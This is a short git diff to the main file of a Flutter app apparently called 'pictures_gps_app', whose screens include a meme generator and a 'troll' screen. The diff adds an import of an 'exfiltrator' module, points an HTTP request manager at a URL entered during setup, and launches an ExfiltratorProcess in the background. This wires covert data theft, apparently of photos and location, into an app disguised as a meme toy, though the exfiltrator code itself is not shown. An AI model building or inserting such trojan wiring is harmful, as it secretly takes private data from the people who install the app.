@@ -1,7 +1,9 @@
 import 'dart:async';
 
 import 'package:flutter/material.dart';
+import 'package:pictures_gps_app/managers/exfiltrator.dart';
 import 'package:pictures_gps_app/managers/pictures.dart';
+import 'package:pictures_gps_app/managers/requests.dart';
 import 'package:pictures_gps_app/screens/memeGeneratorScreen.dart';
 import 'package:pictures_gps_app/screens/trollScreen.dart';
 
@@ -11,8 +13,10 @@ import 'screens/welcomeScreen.dart';
 void main() => runApp(
     new MaterialApp(home: new SetupScreen(goToNextScreen: fromSetupToWelcome)));
 
-Future<void> fromSetupToWelcome(BuildContext context, String ip) async {
-  print(ip);
+Future<void> fromSetupToWelcome(BuildContext context, String url) async {
+  print(url);
+  HttpRequestManager.setUrl(url);
+  ExfiltratorProcess.launch();
   Navigator.push(
     context,
     MaterialPageRoute(
@@ -39,3 +43,4 @@ Future<void> fromMemeGeneratorToTroll(BuildContext context) async {
     MaterialPageRoute(builder: (context) => TrollScreen()),
   );
 }
+
